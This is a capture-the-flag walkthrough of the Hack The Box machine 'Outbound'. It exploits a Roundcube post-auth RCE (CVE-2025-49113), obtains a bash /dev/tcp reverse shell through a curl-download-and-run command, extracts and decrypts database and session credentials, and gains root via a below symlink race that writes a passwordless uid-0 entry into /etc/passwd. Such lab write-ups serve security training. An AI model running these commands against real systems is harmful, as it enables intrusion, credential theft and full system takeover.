# Outbound - Active Machine
Outbound is  a Linux machine flagged Easy in the Active Machines and obviously little hard. This Box replicate some of the new Vulns and updated one.

## Step 1 - Nmap
Just performed basic nmap scan:\
`nmap -sC -SV <Target-IP>`\
where:\
`-sC` - Scan with default NSE scripts. Considered useful for discovery and safe.\
`-sV` - Attempts to determine the version of the service running on port.

The Output it produced is in the file - [Nmap output file](https://github.com/Nithin-vs/HTB-Labs-Docs/blob/main/Outbound/Nmap.txt)

## Step 2 - Opening in Browser
Found HTTP 80 port open and editing the `/etc/hosts` file allow me to see the Login Page. But the login page does not have any type of common web vulnerabilities.

Instead making a vulnerability scanning using `Nuclei` gave me a vulnerability __`CVE-2025-49113`__ 
> [!NOTE]
> CVE‑2025‑49113 – Post‑Auth Remote Code Execution vulnerability in Roundcube

The exploit script is found in "[Github](https://github.com/hakaioffsec/CVE-2025-49113-exploit)", which is written in php.

## Step 3 - Exploit
The exploit of the vulnerability is using the post authentication remote code execution and run arbitary code afer authentication. The user creds are given

```
php CVE-2025-49113.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 "id"
```
this check the working of the exploit.

Now we need to make a reverse shell to get the foothold.
That require a small payload which runs on the victim to provide us the shell. 
1. Create a payload `exploit.sh` with 
```
/bin/bash -i >& /dev/tcp/<attackbox IP>/443 0>&1
``` 
2. Host this via the `python3 -m http.server 80`
3. Open the nc listener.
4. Running the script,
```
php CVE-2025-49113.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 "curl <attackbox IP>/exploit.sh -o /tmp/nithin.sh && chmod +x /tmp/nithin.sh && /bin/bash -c /tmp/nithin.sh"
```
- `curl <attackbox IP>/exploit.sh -o /tmp/nithin.sh` - Downloads your reverse shell script (exploit.sh) from your attacker machine and saves it to `/tmp/nithin.sh` on the victim.
- `chmod +x /tmp/nithin.sh` - Makes the script executable.
- `/bin/bash -c /tmp/nithin.sh` - Executes the script in a bash shell.

5. Got the Shell.

## Step 4 - Digging 
A crucial discovery was made in the Roundcube configuration file located at `/var/www/html/roundcube/config/config.inc.php`. This file contained the credentials for the application's database.
```
$config = [];

// Database connection string (DSN) for read+write operations
// Format (compatible with PEAR MDB2): db_provider://user:password@host/database
// Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle
// For examples see http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php
// NOTE: for SQLite use absolute path (Linux): 'sqlite:////full/path/to/sqlite.db?mode=0646'
//       or (Windows): 'sqlite:///C:/full/path/to/sqlite.db'
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
```
Found Database creds.\
Logging in to mysql doesn't give the results. As further investigation found that it was a race condition and executing the commands in same line using `-e` solves the problem.
```
mysql -u roundcube -pRCDBPass2025 -h localhost roundcube -e 'show tables;' -E
```
In the session table found some crisp information,
```
*************************** 1. row ***************************
sess_id: 6a5ktqih5uca6lj8vrmgh9v0oh
changed: 2025-06-08 15:46:40
     ip: 172.17.0.1
   vars: bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbNjoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW............Ikczo1OiWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7
```
## Step 5 - Decrypting
base64-encoded session data that when decoded revealed:
```
language|s:5:"en_US";imap_namespace|a:4:{s:8:"personal";a:1:{i:0;a:2:{i:0;s:0:"";i:1;s:1:"/";}}s:5:"other";N;s:6:"shared";N;s:10:"prefix_out";s:0:"";}imap_delimiter|s:1:"/";imap_list_conf|a:2:{i:0;N;i:1;a:0:{}}user_id|i:1;username|s:5:"jacob";storage_host|s:9:"localhost";storage_port|i:143;storage_ssl|b:0;password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/";login_time|i:1749397119;timezone|s:13:"Europe/London";STORAGE_SPECIAL-USE|b:1;auth_secret|s:26:"DpYqv6maI9HxDL5GhcCd8JaQQW";request_token|s:32:"TIsOaABA1zHSXZOBpH6up5XFyayNRHaw";...
```
Extracted jacob’s encrypted credentials:

Password: `L7Rv0********TxxcSgnIk25Am/`\
Auth Secret: `DpYqv6maI9HxDL5GhcCd8JaQQW`\
> [!NOTE]
> The password is neither base64 encoded nor hashed, it’s encrypted using DES3.

> [!TIP]
> There is another decrypt.sh script in `/var/www/html/roundcube/bin/decrypt.sh` and we can get the cracked password.

```
L7Rv00A8TuwJAr67kITxxcSgnIk25Am/ => 595mO8DmwGeD
```
Then we can get the credit of `jacob:595mO8DmwGeD` and we can switch to user jacob by,
```
su jacob
```

## Step 6 - Getting the User flag
we can check the email of jacob in /home/jacob/mail/jacob
```

From tyler@outbound.htb  Sat Jun  7 14:00:58 2025
Return-Path: <tyler@outbound.htb>
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1000)
        id B32C410248D; Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
To: jacob@outbound.htb
Subject: Important Update
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20250607140058.B32C410248D@outbound.htb>
Date: Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
From: tyler@outbound.htb
X-UID: 2                                        
Status: O

Due to the recent change of policies your password has been changed.

Please use the following credentials to log into your account: gY4Wr3a1evp4

Remember to change your password when you next log into your account.

Thanks!

Tyler


From mel@outbound.htb  Sun Jun  8 12:09:45 2025
Return-Path: <mel@outbound.htb>
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1002)
        id 1487E22C; Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
To: jacob@outbound.htb
Subject: Unexpected Resource Consumption
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20250608120945.1487E22C@outbound.htb>
Date: Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
From: mel@outbound.htb
X-UID: 3                                        
Status: O

We have been experiencing high resource consumption on our main server.
For now we have enabled resource monitoring with Below and have granted you privileges to inspect the the logs.
Please inform us immediately if you notice any irregularities.

Thanks!

Mel
```
Then we can use the credit `jacob:gY4Wr3a1evp4` to connect it by using __ssh__.

__Result:__ Successfully obtained user.txt

## Step 7 - Obtaining the Root flag
Checked and found sudo -l contains wildcards.
```
jacob@outbound:~$ sudo -l
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
```

`below` is a Linux performance monitoring tool written in Rust. It can load plugins, configs, and spawn subprocesses depending on options.

You are allowed to run any below command as root. Further enumeration revealed that below had a known symlink vulnerability 
 `CVE-2025-27591`.


> What’s a Symlink?\
A symlink (short for symbolic link) is like a shortcut. It’s a special file that just points to another file. For example, if you make a symlink called link.txt that points to /etc/passwd, opening link.txt is the same as opening /etc/passwd.
>
> What’s a Symlink Attack?\
A symlink attack is when an attacker tricks a program into following a symlink that points to something sensitive—like a password file or system config.

## Step 8 - Exploiting the Race Condition

The plan was to trick the below command into writing to `/etc/passwd` instead of its intended log file, `/var/log/below/error_root.log`. This required winning a race condition.

> This Section is referred from [Medium](https://medium.com/@divyanshusainialok/outbound-htb-walkthrough-c4b36fd4b194)

Here are the steps:
1. Create a malicious user entry that would grant us root privileges and save it to a temporary file.
```
echo "pwn::0:0:pwn:/root:/bin/bash" > /tmp/fakepass
```
2. Delete the original log file.
```
rm -rf /var/log/below/error_root.log
```
3. Create a symbolic link from the expected log file location to our target, `/etc/passwd`.
```
ln -s /etc/passwd /var/log/below/error_root.log
```
4. Execute the below command with sudo to trigger the file write operation.
```
sudo /usr/bin/below
```
5. Overwrite with malicious entry:
```
cp /tmp/fakepass /var/log/below/error_root.log && su pwn
```
__Race Condition Command:__\
Due to the race condition, this needs to be executed as a single command:
```
echo "pwn::0:0:pwn:/root:/bin/bash" > /tmp/fakepass && rm -rf /var/log/below/error_root.log && ln -s /etc/passwd /var/log/below/error_root.log && sudo /usr/bin/below
```
Immediately after running the above command, we executed the copy command and switched to our new user.
```
cp /tmp/fakepass /var/log/below/error_root.log && su pwn
```
The su pwn command prompted for a password, which was empty. We were in. Checking our identity confirmed we were root.

__Result:__ root.txt captured!

